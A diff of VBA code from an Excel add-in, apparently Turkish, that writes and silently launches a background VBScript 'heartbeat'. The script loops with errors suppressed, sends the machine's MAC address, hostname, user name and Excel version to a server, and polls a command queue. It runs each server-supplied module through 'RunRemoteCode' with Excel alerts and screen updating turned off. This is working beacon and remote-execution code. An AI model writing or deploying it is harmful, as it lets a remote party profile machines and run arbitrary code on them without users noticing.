@@ -1,7 +1,4 @@
 Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
-    ' param: {"intervalMin":1,"stop":false}  veya sadece "1" (dakika)
-    ' Arka planda VBScript ile periyodik heartbeat gönderir.
-    ' teklif.xlam'a EK KOD GEREKMEz.
     Dim p As String : p = Trim(CStr(param))
 
     Dim stopFlag    As Boolean : stopFlag    = False
@@ -27,12 +24,7 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
         Exit Function
     End If
 
-    ' Önceki stop flag'i temizle
     If Dir(stopFlagPath) <> "" Then Kill stopFlagPath
-
-    ' Zaten çalışıyorsa yeniden başlatma
-    Dim prevActive As String : prevActive = GetSetting("ilhan", "Heartbeat", "active", "false")
-    ' (Yeniden başlatmaya izin ver — önceki VBScript zaten kapanmış olabilir)
 
     ' ----- Bilgileri Topla -----
     Dim mac      As String : mac      = GetFirstMACAddress()
@@ -50,7 +42,7 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
     Dim vbsPath As String : vbsPath = Environ("TEMP") & "\hb_ping.vbs"
     Dim fNum As Integer   : fNum = FreeFile
     Open vbsPath For Output As #fNum
-        Call WriteVbs(fNum, mac, hostname, usr, excelVer, baseUrl, intervalMs, stopFlagPath)
+        Call WriteHbVbs(fNum, mac, hostname, usr, excelVer, baseUrl, intervalMs, stopFlagPath)
     Close #fNum
 
     ' ----- Arka Planda Başlat -----
@@ -65,58 +57,86 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
     Set DynamicFunc = Nothing
 End Function
 
-' VBScript satırlarını dosyaya yazar
-Private Sub WriteVbs(fNum As Integer, _
-                     mac As String, hostname As String, usr As String, _
-                     excelVer As String, baseUrl As String, _
-                     intervalMs As Long, stopFlagPath As String)
+' ─────────────────────────────────────────────────────────────────────────────
+' VBScript dosyasını yazar.
+' Kural: Print içinde tırnak için SADECE Q (tek " karakteri) kullan.
+'        VBScript string'i içinde gerçek " karakteri = Q & Q (iki tırnak).
+' ─────────────────────────────────────────────────────────────────────────────
+Private Sub WriteHbVbs(fNum As Integer, _
+                        mac As String, hostname As String, usr As String, _
+                        excelVer As String, baseUrl As String, _
+                        intervalMs As Long, stopFlagPath As String)
 
-    Dim Q  As String : Q  = Chr(34)
-    Dim mac_e  As String : mac_e  = JsonEsc(mac)
-    Dim host_e As String : host_e = JsonEsc(hostname)
-    Dim usr_e  As String : usr_e  = JsonEsc(usr)
-    Dim ver_e  As String : ver_e  = JsonEsc(excelVer)
+    Dim Q   As String : Q   = Chr(34)    ' tek tırnak karakteri  "
+    Dim QQ  As String : QQ  = Q & Q     ' iki tırnak            ""  (VBScript içi " kaçış)
 
-    ' ─────────────────────────────────────────────────────────
-    ' Script-level On Error Resume Next: hiçbir hata scripti çökertmez
+    Dim mac_e   As String : mac_e   = JsonEsc(mac)
+    Dim host_e  As String : host_e  = JsonEsc(hostname)
+    Dim usr_e   As String : usr_e   = JsonEsc(usr)
+    Dim ver_e   As String : ver_e   = JsonEsc(excelVer)
+
+    ' ─── Script-level error handler — döngü asla ölmez ───────────────
     Print #fNum, "On Error Resume Next"
     Print #fNum, ""
-    Print #fNum, "Dim url   : url   = " & Q & baseUrl & Q
-    Print #fNum, "Dim intMs : intMs = " & intervalMs
-    Print #fNum, "Dim sflag : sflag = " & Q & stopFlagPath & Q
-    Print #fNum, "Dim macAddr : macAddr = " & Q & mac_e & Q
+    Print #fNum, "Dim url    : url    = " & Q & baseUrl      & Q
+    Print #fNum, "Dim intMs  : intMs  = " & intervalMs
+    Print #fNum, "Dim sflag  : sflag  = " & Q & stopFlagPath & Q
+    Print #fNum, "Dim macStr : macStr = " & Q & mac_e        & Q
     Print #fNum, ""
-    Print #fNum, "Dim wsh  : Set wsh  = CreateObject(" & Q & "WScript.Shell" & Q & ")"
-    Print #fNum, "Dim fso  : Set fso  = CreateObject(" & Q & "Scripting.FileSystemObject" & Q & ")"
+    Print #fNum, "Dim wsh : Set wsh = CreateObject(" & Q & "WScript.Shell" & Q & ")"
+    Print #fNum, "Dim fso : Set fso = CreateObject(" & Q & "Scripting.FileSystemObject" & Q & ")"
     Print #fNum, ""
-    Print #fNum, "' ─── Ana döngü ───"
+    Print #fNum, "'────────── Ana Döngü ──────────────────────────────────────────"
     Print #fNum, "Do While True"
     Print #fNum, ""
-    Print #fNum, "  ' Excel hâlâ açık mı? GetObject ile senkron kontrol"
-    Print #fNum, "  Dim xlApp"
-    Print #fNum, "  On Error Resume Next"
-    Print #fNum, "  Set xlApp = GetObject(, " & Q & "Excel.Application" & Q & ")"
-    Print #fNum, "  On Error GoTo 0"
-    Print #fNum, "  If IsNull(xlApp) Or IsEmpty(xlApp) Or (xlApp Is Nothing) Then WScript.Quit"
-    Print #fNum, "  Set xlApp = Nothing"
+
+    ' ── Excel var mı? tasklist ile SENKRON kontrol ────────────────────
+    ' VBScript içinde: wsh.Exec("cmd /c tasklist /FI ""IMAGENAME eq EXCEL.EXE"" /NH")
+    ' VBA Print:  Q = "   QQ = ""
+    Print #fNum, "  Dim chk : Set chk = wsh.Exec(" & Q & _
+                    "cmd /c tasklist /FI " & QQ & "IMAGENAME eq EXCEL.EXE" & QQ & " /NH" & Q & ")"
+    Print #fNum, "  If Not IsNull(chk) Then"
+    Print #fNum, "    Do While chk.Status = 0 : WScript.Sleep 100 : Loop"
+    Print #fNum, "    Dim xlOut : xlOut = " & Q & Q
+    Print #fNum, "    If Not chk.StdOut Is Nothing Then xlOut = chk.StdOut.ReadAll"
+    Print #fNum, "    If InStr(LCase(xlOut), " & Q & "excel.exe" & Q & ") = 0 Then WScript.Quit"
+    Print #fNum, "  Else"
+    Print #fNum, "    WScript.Quit"
+    Print #fNum, "  End If"
+    Print #fNum, "  Set chk = Nothing"
     Print #fNum, ""
-    Print #fNum, "  ' Stop flag kontrolü"
+
+    ' ── Stop flag ──────────────────────────────────────────────────────
     Print #fNum, "  If fso.FileExists(sflag) Then WScript.Quit"
     Print #fNum, ""
-    Print #fNum, "  ' Timestamp oluştur"
+
+    ' ── Timestamp ──────────────────────────────────────────────────────
     Print #fNum, "  Dim ts"
-    Print #fNum, "  ts = Year(Now) & " & Q & "-" & Q & " & Right(" & Q & "0" & Q & " & Month(Now),2) & " & Q & "-" & Q & " & Right(" & Q & "0" & Q & " & Day(Now),2)"
-    Print #fNum, "  ts = ts & " & Q & "T" & Q & " & Right(" & Q & "0" & Q & " & Hour(Now),2) & " & Q & ":" & Q & " & Right(" & Q & "0" & Q & " & Minute(Now),2) & " & Q & ":" & Q & " & Right(" & Q & "0" & Q & " & Second(Now),2)"
+    Print #fNum, "  ts = Year(Now) & " & Q & "-" & Q & _
+                    " & Right(" & Q & "0" & Q & " & Month(Now),2)" & _
+                    " & " & Q & "-" & Q & _
+                    " & Right(" & Q & "0" & Q & " & Day(Now),2)"
+    Print #fNum, "  ts = ts & " & Q & "T" & Q & _
+                    " & Right(" & Q & "0" & Q & " & Hour(Now),2)" & _
+                    " & " & Q & ":" & Q & _
+                    " & Right(" & Q & "0" & Q & " & Minute(Now),2)" & _
+                    " & " & Q & ":" & Q & _
+                    " & Right(" & Q & "0" & Q & " & Second(Now),2)"
     Print #fNum, ""
-    Print #fNum, "  ' JSON body"
+
+    ' ── JSON body ──────────────────────────────────────────────────────
+    ' Üretilen VBScript satırı:
+    '   bd = "{""mac"":""<mac>"",""hostname"":""<host>"",""user"":""<usr>"",""excelVersion"":""<ver>"",""timestamp"":""" & ts & """}"
     Print #fNum, "  Dim bd"
-    Print #fNum, "  bd = " & Q & "{" & Chr(34) & "mac" & Chr(34) & ":" & Chr(34) & mac_e & Chr(34) & "," & Q
-    Print #fNum, "  bd = bd & " & Q & Chr(34) & "hostname" & Chr(34) & ":" & Chr(34) & host_e & Chr(34) & "," & Q
-    Print #fNum, "  bd = bd & " & Q & Chr(34) & "user" & Chr(34) & ":" & Chr(34) & usr_e & Chr(34) & "," & Q
-    Print #fNum, "  bd = bd & " & Q & Chr(34) & "excelVersion" & Chr(34) & ":" & Chr(34) & ver_e & Chr(34) & "," & Q
-    Print #fNum, "  bd = bd & " & Q & Chr(34) & "timestamp" & Chr(34) & ":" & Chr(34) & Q & " & ts & " & Q & Chr(34) & "}" & Q
+    Print #fNum, "  bd = " & Q & "{" & QQ & "mac" & QQ & ":" & QQ & mac_e & QQ & _
+                                  "," & QQ & "hostname" & QQ & ":" & QQ & host_e & QQ & _
+                                  "," & QQ & "user" & QQ & ":" & QQ & usr_e & QQ & _
+                                  "," & QQ & "excelVersion" & QQ & ":" & QQ & ver_e & QQ & _
+                                  "," & QQ & "timestamp" & QQ & ":" & QQ & Q & _
+                                  " & ts & " & Q & QQ & "}" & Q
     Print #fNum, ""
-    Print #fNum, "  ' Her iterasyonda yeni HTTP nesnesi — stale connection önler"
+
+    ' ── Heartbeat POST ─────────────────────────────────────────────────
     Print #fNum, "  Dim http : Set http = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
     Print #fNum, "  http.Open " & Q & "POST" & Q & ", url & " & Q & "heartbeat" & Q & ", False"
     Print #fNum, "  http.setTimeouts 5000, 5000, 15000, 15000"
@@ -124,33 +144,49 @@ Private Sub WriteVbs(fNum As Integer, _
     Print #fNum, "  http.send bd"
     Print #fNum, "  Set http = Nothing"
     Print #fNum, ""
-    Print #fNum, "  ' Komut kuyruğunu kontrol et"
+
+    ' ── Komut Kuyruğu ──────────────────────────────────────────────────
     Print #fNum, "  Dim http2 : Set http2 = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
-    Print #fNum, "  http2.Open " & Q & "GET" & Q & ", url & " & Q & "commands/pending/" & Q & " & macAddr, False"
+    Print #fNum, "  http2.Open " & Q & "GET" & Q & ", url & " & Q & "commands/pending/" & Q & " & macStr, False"
     Print #fNum, "  http2.setTimeouts 5000, 5000, 10000, 10000"
     Print #fNum, "  http2.send"
+    Print #fNum, ""
     Print #fNum, "  If http2.Status = 200 Then"
     Print #fNum, "    Dim resp : resp = http2.responseText"
-    Print #fNum, "    If InStr(resp, " & Q & Chr(34) & "data" & Chr(34) & ":null" & Q & ") = 0 And InStr(resp, " & Q & Chr(34) & "data" & Chr(34) & ":{" & Q & ") > 0 Then"
-    Print #fNum, "      Dim cmdId   : cmdId   = ExtractVal(resp, " & Q & Chr(34) & "id" & Chr(34) & ":" & Q & ")"
-    Print #fNum, "      Dim cmdName : cmdName = ExtractStrVal(resp, " & Q & Chr(34) & "module_name" & Chr(34) & ":" & Q & ")"
+    ' VBScript içi: InStr(resp, """data"":null") ve InStr(resp, """data"":{")
+    Print #fNum, "    If InStr(resp, " & Q & QQ & "data" & QQ & ":null" & Q & ") = 0 _"
+    Print #fNum, "       And InStr(resp, " & Q & QQ & "data" & QQ & ":{" & Q & ") > 0 Then"
+    Print #fNum, "      Dim cmdId   : cmdId   = ExtractVal(resp, " & Q & QQ & "id" & QQ & ":" & Q & ")"
+    Print #fNum, "      Dim cmdName : cmdName = ExtractStr(resp, " & Q & QQ & "module_name" & QQ & ":" & Q & ")"
     Print #fNum, "      If cmdId <> " & Q & Q & " And cmdName <> " & Q & Q & " Then"
-    Print #fNum, "        ' Komutu hemen çalıştır — Excel açık olduğundan RunRemoteCode çağırabilir"
-    Print #fNum, "        Dim cmdFile : cmdFile = Environ(" & Q & "TEMP" & Q & ") & " & Q & "\hb_cmd_" & Q & " & cmdId & " & Q & ".vbs" & Q
-    Print #fNum, "        Dim cf : Set cf = fso.OpenTextFile(cmdFile, 2, True)"
-    Print #fNum, "        cf.WriteLine " & Q & "On Error Resume Next" & Q
-    Print #fNum, "        cf.WriteLine " & Q & "Dim xl : Set xl = GetObject(, " & Chr(34) & "Excel.Application" & Chr(34) & ")" & Q
-    Print #fNum, "        cf.WriteLine " & Q & "If Not xl Is Nothing Then" & Q
-    Print #fNum, "        cf.WriteLine " & Q & "  xl.Run " & Chr(34) & "zInternet.RunRemoteCode" & Chr(34) & ", " & Chr(34) & Q & " & cmdName & " & Q & Chr(34) & Q
-    Print #fNum, "        cf.WriteLine " & Q & "End If" & Q
-    Print #fNum, "        cf.Close"
-    Print #fNum, "        wsh.Run " & Q & "wscript.exe //B " & Chr(34) & Q & " & cmdFile & " & Q & Chr(34) & Q & ", 0, False"
-    Print #fNum, "        ' Komutu tamamlandı olarak işaretle"
+    Print #fNum, ""
+
+    ' ── GetObject → DisplayAlerts=False → çalıştır ─────────────────────
+    Print #fNum, "        Dim xl : Set xl = GetObject(, " & Q & "Excel.Application" & Q & ")"
+    Print #fNum, "        If Not xl Is Nothing Then"
+    Print #fNum, "          xl.DisplayAlerts = False"
+    Print #fNum, "          xl.ScreenUpdating = False"
+    ' Açık non-addin wb yoksa yeni ekle
+    Print #fNum, "          Dim hasWb : hasWb = False"
+    Print #fNum, "          Dim wb"
+    Print #fNum, "          For Each wb In xl.Workbooks"
+    Print #fNum, "            If Not wb.IsAddin Then hasWb = True : Exit For"
+    Print #fNum, "          Next"
+    Print #fNum, "          If Not hasWb Then xl.Workbooks.Add"
+    ' xl.Run "zInternet.RunRemoteCode", cmdName
+    Print #fNum, "          xl.Run " & Q & "zInternet.RunRemoteCode" & Q & ", cmdName"
+    Print #fNum, "          xl.DisplayAlerts = True"
+    Print #fNum, "          xl.ScreenUpdating = True"
+    Print #fNum, "          Set xl = Nothing"
+    Print #fNum, "        End If"
+    Print #fNum, ""
+
+    ' ── PATCH done ─────────────────────────────────────────────────────
     Print #fNum, "        Dim http3 : Set http3 = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
     Print #fNum, "        http3.Open " & Q & "PATCH" & Q & ", url & " & Q & "commands/" & Q & " & cmdId, False"
     Print #fNum, "        http3.setRequestHeader " & Q & "Content-Type" & Q & ", " & Q & "application/json" & Q
     Print #fNum, "        http3.setTimeouts 5000, 5000, 10000, 10000"
-    Print #fNum, "        http3.send " & Q & "{" & Chr(34) & "status" & Chr(34) & ":" & Chr(34) & "done" & Chr(34) & "}" & Q
+    Print #fNum, "        http3.send " & Q & "{" & QQ & "status" & QQ & ":" & QQ & "done" & QQ & "}" & Q
     Print #fNum, "        Set http3 = Nothing"
     Print #fNum, "      End If"
     Print #fNum, "    End If"
@@ -160,6 +196,8 @@ Private Sub WriteVbs(fNum As Integer, _
     Print #fNum, "  WScript.Sleep intMs"
     Print #fNum, "Loop"
     Print #fNum, ""
+
+    ' ── Yardımcı fonksiyonlar ──────────────────────────────────────────
     Print #fNum, "Function ExtractVal(s, key)"
     Print #fNum, "  Dim p1 : p1 = InStr(s, key)"
     Print #fNum, "  If p1 = 0 Then Exit Function"
@@ -167,13 +205,13 @@ Private Sub WriteVbs(fNum As Integer, _
     Print #fNum, "  Do While Mid(s, p1, 1) = " & Q & " " & Q & " : p1 = p1 + 1 : Loop"
     Print #fNum, "  Dim p2 : p2 = p1"
     Print #fNum, "  Do While p2 <= Len(s)"
-    Print #fNum, "    If InStr(" & Q & ",}] " & Q & " & Chr(13) & Chr(10), Mid(s, p2, 1)) > 0 Then Exit Do"
+    Print #fNum, "    If InStr(" & Q & ",}] " & Q & ", Mid(s, p2, 1)) > 0 Then Exit Do"
     Print #fNum, "    p2 = p2 + 1"
     Print #fNum, "  Loop"
     Print #fNum, "  ExtractVal = Trim(Mid(s, p1, p2 - p1))"
     Print #fNum, "End Function"
     Print #fNum, ""
-    Print #fNum, "Function ExtractStrVal(s, key)"
+    Print #fNum, "Function ExtractStr(s, key)"
     Print #fNum, "  Dim p1 : p1 = InStr(s, key)"
     Print #fNum, "  If p1 = 0 Then Exit Function"
     Print #fNum, "  p1 = p1 + Len(key)"
@@ -181,7 +219,7 @@ Private Sub WriteVbs(fNum As Integer, _
     Print #fNum, "  If Mid(s, p1, 1) = Chr(34) Then"
     Print #fNum, "    p1 = p1 + 1"
     Print #fNum, "    Dim p2 : p2 = InStr(p1, s, Chr(34))"
-    Print #fNum, "    If p2 > p1 Then ExtractStrVal = Mid(s, p1, p2 - p1)"
+    Print #fNum, "    If p2 > p1 Then ExtractStr = Mid(s, p1, p2 - p1)"
     Print #fNum, "  End If"
     Print #fNum, "End Function"
 End Sub
